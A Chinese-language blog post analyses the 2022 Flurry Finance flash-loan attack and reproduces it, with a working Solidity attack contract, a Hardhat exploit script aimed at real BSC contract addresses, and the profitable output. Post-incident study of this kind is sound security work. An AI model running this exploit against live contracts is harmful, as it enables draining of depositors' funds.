# flurry finance 攻击事件分析与复现

## 写在前面

这个攻击事件是2月份的，之前写月报的时候正好卡在月末的时间节点，由于之前没接触过闪电贷攻击的相关事件加上这个事件的热度不高，全网只有Certik一家的分析（其他的分析都是建立在Certik上），且Certik这个分析很模糊，看得我一头雾水，所以一直拖到了现在才开始详细分析。

这个是Certik的分析：https://twitter.com/CertiKCommunity/status/1496263130728603648

大致的意思就是攻击者创造了一个魔改的ERC20，将approve函数设置为调用更新币价的函数，在闪电贷过程中调用approve就会导致币价更新，而此时由于闪电贷的转款，会导致币价降低。

那么到这我就看不懂了：按理说闪电贷只要满足用户在一笔交易中完成借款还款即可，至于用户拿钱去干了什么闪电贷管不着。

那么为什么要利用漏洞来调用更新币价函数，我直接在闪电贷调用不就得了？

## Flurry Finance 简介

Flurry Finance是一个投资聚合协议，用户可以向协议中存储稳定币（如BUSD、USDT等）换取等量的rhotoken，通过协议内置的投资策略获取收益，用户可以随时取出或者存储对应的稳定币及其收益。

当用户将资产投入协议中，那么用户就可以使用协议内的投资策略来获取收益。

FlurryFinance只采用了部分最具有投资价值defi项目作为投资目标，具体项目以及对应的策略参考：https://docs.flurry.finance/flurry-finance/the-rhotoken/supporting-strategies

在默认情况下，用户存储稳定币换取的rhotoken数量和价格上的关系为1:1。

当用户选择开启rebase选项后，用户的rhotoken在产生收益的过程中会增加，并且保持rhotoken和稳定币的1:1兑换关系。

实现rhotoken价格恒定的底层逻辑是将用户的存款表示为实际存款与Multiplier的乘积。也就是说，rho代币的价格与multipier成直接正相关关系。

```solidity
    function balanceOf(address account) public view override(ERC20Upgradeable, IERC20Upgradeable) returns (uint256) {
        if (isRebasingAccount(account)) {
            return _timesMultiplier(_balances[account]);
        }
        return _balances[account];
    }
    function _timesMultiplier(uint256 input) internal view returns (uint256) {
        return (input * multiplier) / ONE;
    }
    function isRebasingAccount(address account) public view override returns (bool) {
        return
            (_rebaseOptions[account] == RebaseOption.REBASING) ||
            (_rebaseOptions[account] == RebaseOption.UNKNOWN && !account.isContract());
    }
```

这一关键的multiplier计算是根据投资策略组合中所有策略的标的资产存量来进行计算的。存量越多，对应的Multiplier越大；存量越少，则对应的Multiplier越小。具体来说，M = ( TVL - nonrebasingRHO) / rebasingRHO。

```solidity
    function rebase() external override onlyRole(REBASE_ROLE) whenNotPaused nonReentrant {
        IVaultConfig.Strategy[] memory strategies = config.getStrategiesList();

        uint256 originalTvlInRho = rhoToken().totalSupply();
        if (originalTvlInRho == 0) {
            return;
        }
        // rebalance fund
        _rebalance();
        uint256 underlyingInvested;
        for (uint256 i = 0; i < strategies.length; i++) {
            underlyingInvested += strategies[i].target.updateBalanceOfUnderlying();
        }
        uint256 currentTvlInUnderlying = reserve() + underlyingInvested;
        uint256 currentTvlInRho = (currentTvlInUnderlying * rhoOne()) / underlyingOne();
        uint256 rhoRebasing = rhoToken().unadjustedRebasingSupply();
        uint256 rhoNonRebasing = rhoToken().nonRebasingSupply();

        if (rhoRebasing < 1e18) {
            // in this case, rhoNonRebasing = rho TotalSupply
            uint256 originalTvlInUnderlying = (originalTvlInRho * underlyingOne()) / rhoOne();
            if (currentTvlInUnderlying > originalTvlInUnderlying) {
                // invested accrued interest
                // all the interest goes to the fee pool since no one is entitled for the interest.
                uint256 feeToMint = ((currentTvlInUnderlying - originalTvlInUnderlying) * rhoOne()) / underlyingOne();
                rhoToken().mint(address(this), feeToMint);
                feeInRho += feeToMint;
            }
            return;
        }

        // from this point forward, rhoRebasing > 0
        if (currentTvlInRho == originalTvlInRho) {
            // no fees charged, multiplier does not change
            return;
        }
        if (currentTvlInRho < originalTvlInRho) {//final branch in this attack
            // this happens when fund is initially deployed to compound and get balance of underlying right away
            // strategy losing money, no fees will be charged
            uint256 _newM = ((currentTvlInRho - rhoNonRebasing) * 1e36) / rhoRebasing;
            rhoToken().setMultiplier(_newM);
            return;
        }
        uint256 fee36 = (currentTvlInRho - originalTvlInRho) * config.managementFee();
        uint256 fee18 = fee36 / 1e18;
        if (fee18 > 0) {
            // mint vault's fee18
            rhoToken().mint(address(this), fee18);
            feeInRho += fee18;
        }
        uint256 newM = ((currentTvlInRho * 1e18 - rhoNonRebasing * 1e18 - fee36) * 1e18) / rhoRebasing;
        rhoToken().setMultiplier(newM);
    }
```

用户与FlurryFinance的交互接口为对应的Vault合约，用户的资金也是流向Vault中，并由Vault生成Rho代币。

而rebasing RHOtoken的定价则是由对应的投资策略中的余额进行计算。

也就是说，价格计算和用户存储资产的地址不一样。

## 攻击流程分析

攻击者地址：

0x2A1F4cB6746C259943f7A01a55d38CCBb4629B8E

0x0F3C0c6277BA049B6c3f4F3e71d677b923298B35

攻击合约地址：

0xB7A740d67C78bbb81741eA588Db99fBB1c22dFb7

被攻击的vault：

0x4bad4d624fd7cabeeb284a6cc83df594bfdf26fd

查看其交易序列可以发现明显的pattern：

![image-20220403195236764](https://s3cunDa.github.io/assets/post/image-20220403195236764.png)

即先init，然后work，最后调用0741函数，后面的交易都是重复这两个操作。

### init

交易hash：0xd771f2263aa1693bddbcaaf66e2864417d7382c96b706b3894edd024da772009

主要做的工作如下：

1. 获取vault 的 rhotoken的地址：0xd845da3ffc349472fe77dfdfb1f93839a5da8c96
2. 获取vault 的 underlying的地址：0x55d398326f99059ff775485246999027b3197955（BUSD）
3. 将用户（攻击合约）的rebase选项设置为true
4. 用户（攻击合约）的rhotoken和busd approve给vault。
5. 将用户（攻击合约）的BUSD approve给 pancake router。
6. 向攻击者之前创建的魔改ERC20代币（攻击合约）和busd对输入流动性
7. 将前一步产生的流动性转款到要攻击的strategy地址，用于绕过后续函数的判定条件使用。
8. 向vault合约传入busd，mint出rho代币
9. 调用performUpKeep，更新币价
10. 调用redeem销毁rho，然后取出busd。

那么从以上的准备工作可以看出，用户前期只需要创建恶意的交换对以及恶意token，然后向这一交换对中注入一定的资金。在这里注入多少资金没有限制，只需要满足strategy地址有lp存量即可。

至于后面的8-10步，只是为了 测试对应vault的功能，在后续攻击过程中没有意义，所以可以省略。

### work

交易hash：0xa4da20133835e1a39f63e9eb35a1ba2a318a96a26681f700778602b284e91f2a

这个work函数是直接调用的bank合约，也就是实行攻击的这一步。

直接调用的work函数长这个样子，一些地方个人写了注释：

```solidity
    function work(uint256 posId, uint256 pid, uint256 borrow, bytes calldata data)
    external payable onlyEOA nonReentrant {

        if (posId == 0) {  // record borrow position
            posId = currentPos;
            currentPos ++;
            positions[posId].owner = msg.sender;
            positions[posId].productionId = pid;
            positions[posId].debtShare = 0;
            
            userPosition[msg.sender].push(posId);
        } else { 
            require(posId < currentPos, "bad position id");
            require(positions[posId].owner == msg.sender, "not position owner");
            pid = positions[posId].productionId; 
        }
 
        Production storage production = productions[pid];
        require(production.isOpen, 'Production not exists');
        require(borrow == 0 || production.canBorrow, "Production can not borrow");

        calInterest(production.borrowToken);

        uint256 debt = _removeDebt(posId, production).add(borrow);
        bool isBorrowBNB = production.borrowToken == address(0);

        uint256 sendBNB = msg.value;
        uint256 beforeToken = 0;
        if (isBorrowBNB) {
            sendBNB = sendBNB.add(borrow);
            require(sendBNB <= address(this).balance && debt <= banks[production.borrowToken].totalVal, "insufficient BNB in the bank");
            beforeToken = address(this).balance.sub(sendBNB);
        } else { //record balance before flashloan
            beforeToken = SafeToken.myBalance(production.borrowToken);
            require(borrow <= beforeToken && debt <= banks[production.borrowToken].totalVal, "insufficient borrowToken in the bank");
            beforeToken = beforeToken.sub(borrow);
            SafeToken.safeApprove(production.borrowToken, production.goblin, borrow);
        }

        Goblin(production.goblin).work{value:sendBNB}(posId, msg.sender, production.borrowToken, borrow, debt, data);// do flahloan logic

        uint256 backToken = isBorrowBNB? (address(this).balance.sub(beforeToken)) :
            SafeToken.myBalance(production.borrowToken).sub(beforeToken);

        if(backToken > debt) { // if pay off the debt, just do the normal flash loan finalize work
            backToken = backToken.sub(debt);
            debt = 0;

            isBorrowBNB? SafeToken.safeTransferETH(msg.sender, backToken):
                SafeToken.safeTransfer(production.borrowToken, msg.sender, backToken);

        }else if (debt > backToken) { // does not pay off, then record to user debt
            debt = debt.sub(backToken);
            backToken = 0;

            require(debt >= production.minDebt && debt <= production.maxDebt, "Debt scale is out of scope");
            uint256 health = Goblin(production.goblin).health(posId, production.borrowToken);
            require(config.isStable(production.goblin),"!goblin");
            require(health.mul(production.openFactor) >= debt.mul(GLO_VAL), "bad work factor");
        
            _addDebt(posId, production, debt);
        }
        emit Work(posId, debt, backToken);
    }
```

其函数的主要逻辑就是类似于闪电贷，但是借款和还款的流程，在这里是调用` Goblin(production.goblin).work{value:sendBNB}(posId, msg.sender, production.borrowToken, borrow, debt, data);`的方式来进行借款后的逻辑。

而goblin的work函数逻辑如下：

```solidity
    function work(uint256 id, address user, address borrowToken, uint256 borrow, uint256 debt, bytes calldata data)
        override
        external
        payable
        onlyOperator
        nonReentrant
    {
        require(borrowToken == token0 || borrowToken == token1 || borrowToken == address(0), "borrowToken not token0 and token1");

        // 1. Convert this position back to LP tokens.
        _removeShare(id,user);
        // 2. Perform the worker strategy; sending LP tokens + borrowToken; expecting LP tokens.
        (address strategy, bytes memory ext) = abi.decode(data, (address, bytes));
        require(okStrats[strategy], "unapproved work strategy");

        lpToken.transfer(strategy, lpToken.balanceOf(address(this)));

        // transfer the borrow token.
        if (borrow > 0 && borrowToken != address(0)) {
            borrowToken.safeTransferFrom(msg.sender, address(this), borrow);
            borrowToken.safeApprove(address(strategy), 0);
            borrowToken.safeApprove(address(strategy), uint256(-1));
        }
        Strategy(strategy).execute{value:msg.value}(user, borrowToken, borrow, debt, ext);

        // 3. Add LP tokens back to the farming pool.
        _addShare(id,user);

        if (borrowToken == address(0)) {
            SafeToken.safeTransferETH(msg.sender, address(this).balance);
        } else {
            uint256 borrowTokenAmount = borrowToken.myBalance();
            if(borrowTokenAmount > 0){
                SafeToken.safeTransfer(borrowToken, msg.sender, borrowTokenAmount);
            }
        }
    }
```

可以看到goblin只是将闪电贷操作转发给了对应的Strategy来执行。

而stategy的execute的逻辑如下：

```solidity
    function execute(address /* user */, address borrowToken , uint256 /* borrow */, uint256 /* debt */, bytes calldata data)
        override
        external
        payable
        nonReentrant
    {
        // 1. Find out lpToken and liquidity.
        (address _lptoken) = abi.decode(data, (address));
        
        // 2. remove liq
        IUniswapV2Pair lpToken = IUniswapV2Pair(_lptoken);
        address token0 = lpToken.token0();
        address token1 = lpToken.token1();
        bool isBorrowBnb = borrowToken == address(0);
        require(borrowToken == token0 || borrowToken == token1 || isBorrowBnb, "borrowToken not token0 and token1");
        {
            lpToken.approve(address(router), uint256(-1));
            router.removeLiquidity(token0, token1, lpToken.balanceOf(address(this)), 0, 0, address(this), now);
        }
        
        // 3. swap
        borrowToken = isBorrowBnb ? WBNB : borrowToken;
        address tokenRelative = borrowToken == token0 ? token1 : token0;
        tokenRelative.safeApprove(address(router), 0);
        tokenRelative.safeApprove(address(router), uint256(-1));

        address[] memory path = new address[](2);
        path[0] = tokenRelative;
        path[1] = borrowToken;
        router.swapExactTokensForTokens(tokenRelative.myBalance(), 0, path, address(this), now);

        // 4. send
        safeUnWrapperAndAllSend(borrowToken,msg.sender);

    }
```

分析execute函数逻辑，其实际作用就是将用户指定的swapPair全部换为借款代币，用户的借款数额在execute函数中并没有实际作用。

那么这一套流程下来，实际并没有任何资产转到用户名下，整个的资金流是：vault->goblin->strategy，用户没有直接接手整个流程。

在本例中，用户传入的calldata只是用于指定进行最后swap的pair地址，calldata并没有使用在其他的外部调用中。

漏洞点出现在最后一步的execute函数中，由于用户指定了lp pair地址，造成了用户可以调用自定义token的approve函数，而这个函数一开始提到过，会调用performUpKeep，重新计算代币价格。

```solidity
    function performUpkeep(bytes calldata performData) external override {
        lastTimeStamp = block.timestamp;
        for (uint256 i = 0; i < vaults.length; i++) {
            vaults[i].rebase();
        }
        performData;
    }
```

rhotoken的币价计算是根据乘子multiplier，在之前rebase逻辑中可以看到，当rho中的tvl减少时，会导致newM的结果变小。

由于最终的价格是根据策略组合的余额进行计算，而这一步之前用户执行了work函数执行闪电贷逻辑，钱变少了，所以自然最终的计算价格会变低。

所以说，之前的问题就迎刃而解了，本次攻击中的闪电贷规定好了具体的工作步骤，用户不能直接运行其自定义逻辑。

也就是说，在正常调用work的逻辑下，用户不可能调用到perFormUpkeep，因为逻辑都写死了，但是利用漏洞就可以进行更新币价操作。

### 套利

交易hash：0x180f5090b759aa5d28440ed42505d931b69b219405bcf8d906fb07b4e54b1f72

有了之前一步的分析就明了多了，攻击者在上一步拉低了币价，使用闪电贷大量买入低价货币，然后再次调用更新币价函数，使之币价回归正常值（即抬高币价），再进行卖出，以此获利。

## 攻击复现

此次攻击事件中攻击者攻击了多个 vault交易池，手法基本一致，这里只取了其中一例作为演示。

攻击合约：

```solidity
pragma solidity ^ 0.8.0;
interface IVault {
    function mint(uint256 amount) external;
    function redeem(uint256 amount) external;
}
interface IRhoToken  {
    function getMultiplier() external view returns (uint256 multiplier, uint256 lastUpdate);
    function mint(address account, uint256 amount) external;
    function burn(address account, uint256 amount) external;
    function setRebasingOption(bool isRebasing) external;
}
interface IERC20{
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

}
interface IBANK{
    function work(uint256 posId, uint256 pid, uint256 borrow, bytes calldata data) external;
}
interface IPerform{
    function performUpkeep(bytes calldata performData) external;
}
interface IPancakeRouter01 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}
interface IPancakeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IPancakePair {
    function balanceOf(address owner) external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
}
contract attack_erc20{
    address public owner;
    address public vaultAddress     = 0x4BAd4D624FD7cabEeb284a6CC83Df594bFDf26Fd;
    address public rebaseUpKeep     = 0xc8935Eb04ac1698C51a705399A9632c6FaeCa57f;
    address public rhoAddress       = 0xD845dA3fFc349472fE77DFdFb1F93839a5DA8C96;
    address public BUSDAddress      = 0x55d398326f99059fF775485246999027B3197955;
    address public Bank             = 0xbEEB9d4CA070d34c014230BaFdfB2ad44A110142;
    address public PancakeRouter    = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public PancakeFactory   = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address public pair;
    address public strategy         = 0x5085c49828B0B8e69bAe99d96a8e0FCf0A033369;
    address public FLURRY           = 0x47c9BcEf4fE2dBcdf3Abf508f147f1bBE8d4fEf2;
    address public WBNB             = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;



    uint public BUSDBalanceBefore;
    uint public BUSDBalanceAfter;
    uint public rhoBefore;
    uint public rhoAfter;
    uint public Mbefore;
    uint public Mafter;
    uint public MAX = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    
    string public name = 'fake';
    string public symbol = 'FKT';
    uint8 public decimals = 18;  
    uint256 public totalSupply = 1e28; 
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => uint256) public balanceOf;
    constructor(){
        owner = msg.sender;
        balanceOf[owner] = 1e18;
    }
    function _transfer(address _from, address _to, uint _value) internal {

        require(balanceOf[_from] >= _value);  
        require(balanceOf[_to] + _value > balanceOf[_to]);


        balanceOf[_from] -= _value; 
        balanceOf[_to] += _value;
    }

    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint _value) public returns (bool success){
        if(msg.sender == address(strategy)){
            IPerform(rebaseUpKeep).performUpkeep("0x");
        }
        allowance[msg.sender][_spender] = _value; 
        return true;
    }
    function init() public{
        require(msg.sender == owner);
        balanceOf[address(this)] = 1000000;
        IRhoToken(rhoAddress).setRebasingOption(true);
        IERC20(rhoAddress).approve(vaultAddress, MAX);
        IERC20(BUSDAddress).approve(vaultAddress, MAX);
        IERC20(BUSDAddress).approve(PancakeRouter, MAX);
        IERC20(address(this)).approve(PancakeRouter, MAX);
        (, , uint LPamount ) = IPancakeRouter01(PancakeRouter).addLiquidity(BUSDAddress, address(this), 1000, 1000000, 0, 0, address(this), block.timestamp);
        pair = IPancakeFactory(PancakeFactory).getPair(BUSDAddress, address(this));
        IPancakePair(pair).transfer(strategy, LPamount);
        IVault(vaultAddress).mint(10000);
        IPerform(rebaseUpKeep).performUpkeep("0x");
        IVault(vaultAddress).redeem(IERC20(rhoAddress).balanceOf(address(this)));
    }
    function payday() public{
        BUSDBalanceBefore = IERC20(BUSDAddress).balanceOf(address(this));
        (Mbefore, ) = IRhoToken(rhoAddress).getMultiplier();
        IERC20(BUSDAddress).approve(vaultAddress, MAX);
        IERC20(rhoAddress).approve(vaultAddress, MAX);
        IERC20(rhoAddress).approve(PancakeRouter, MAX);
        IERC20(BUSDAddress).approve(PancakeRouter, MAX);

        IVault(vaultAddress).mint(IERC20(BUSDAddress).balanceOf(vaultAddress)*10);
        rhoBefore = IERC20(rhoAddress).balanceOf(address(this));
        IPerform(rebaseUpKeep).performUpkeep("0x");
        (Mafter,) = IRhoToken(rhoAddress).getMultiplier();
        rhoAfter = IERC20(rhoAddress).balanceOf(address(this));
        IVault(vaultAddress).redeem(rhoAfter);

        BUSDBalanceAfter = IERC20(BUSDAddress).balanceOf(address(this));
        
    }
}
```

exp：

```js
const hre = require("hardhat");
async function main() {

    const BUSD = "0x55d398326f99059fF775485246999027B3197955";
    const BUSD_HOLDER = '0xEFDca55e4bCE6c1d535cb2D0687B5567eEF2AE83';
    const BANK_ADDR = '0xc18907269640D11E2A91D7204f33C5115Ce3419e';
    const STRATEGY = '0x5085c49828b0b8e69bae99d96a8e0fcf0a033369'

    let Hack = await hre.ethers.getContractFactory("attack_erc20");
    const hack = await Hack.deploy();
    await hack.deployed();
    console.log("attack contract deployed to:", hack.address);


    await hre.network.provider.request({
        method: "hardhat_impersonateAccount",
        params: [BUSD_HOLDER],
    });
    const signer = await hre.ethers.getSigner(BUSD_HOLDER)
    const IERC20 = await hre.ethers.getContractAt("contracts/attack.sol:IERC20", BUSD, signer);
    //const IRHO = await hre.ethers.getContractAt("contracts/attack.sol:IRhoToken", BUSD, signer);
    let amount = await IERC20.balanceOf(BUSD_HOLDER);
    let tx = await IERC20.transfer(hack.address, amount);
    console.log('Transfer %s BUSD from %s to %s', amount, BUSD_HOLDER, hack.address);

    await hack.init();
    let pairAddr = await hack.pair();
    const IBANK = await hre.ethers.getContractAt("contracts/attack.sol:IBANK", BANK_ADDR, signer);

    let data = hre.ethers.utils.defaultAbiCoder.encode(['address', 'uint', 'uint', 'address' ,'uint'], [STRATEGY, 0x40, 0x40 ,pairAddr, 2]);
    //console.log("data: ", data);

    let borrowAmount = await IERC20.balanceOf(BANK_ADDR);
    await IBANK.work(0, 15, borrowAmount, data);
    console.log("step 2");
    await hack.payday();
    let before = await hack.BUSDBalanceBefore();
    let after = await hack.BUSDBalanceAfter();
    let Mbefore = await hack.Mbefore();
    let Mafter = await hack.Mafter();
    let rhoBefore = await hack.rhoBefore();
    let rhoAfter = await hack.rhoAfter()
    console.log("attacker BUSD before: ", before);
    console.log("attacker BUSD after:  ", after);
    console.log("attacker Mbefore: ", Mbefore);
    console.log("attacker Mafter:  ", Mafter);
    console.log("attacker rho before: ", rhoBefore);
    console.log("attacker rho after:  ", rhoAfter);

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

攻击结果：

```
attack contract deployed to: 0x4BCD98b42fd74c8f386E650848773e841A5d332B
Transfer 203073438574967167623188420 BUSD from 0xEFDca55e4bCE6c1d535cb2D0687B5567eEF2AE83 to 0x4BCD98b42fd74c8f386E650848773e841A5d332B
step 2
attacker BUSD before:  BigNumber { value: "203073438574967167623187419" }
attacker BUSD after:   BigNumber { value: "203090587098027369704261350" }
attacker Mbefore:  BigNumber { value: "751295171398263007193096695790421526" }
attacker Mafter:   BigNumber { value: "904605593422534980373597747412875634" }
attacker rho before:  BigNumber { value: "84036051832809300867950" }
attacker rho after:   BigNumber { value: "101184574893011381941881" }
```

由于之前的攻击，导致 rhotoken 的 multiplier低于正常值，用户可以用稳定币以低价换取rhotoken。调用完performUpkeep后multiplier回归正常值，用户之前换取的rhotoken的数量就会增加（大概是之前的1.2倍），此时用户将rho换回稳定币即可获利。

## 总结

本次攻击FlurryFinance的实现本身没有问题，漏洞点出现在第三方的Strategy合约，但是FlurryFInance本身的设计中标的资产存储地址和用于计算币价的存储地址不同，间接的导致了攻击的发生。







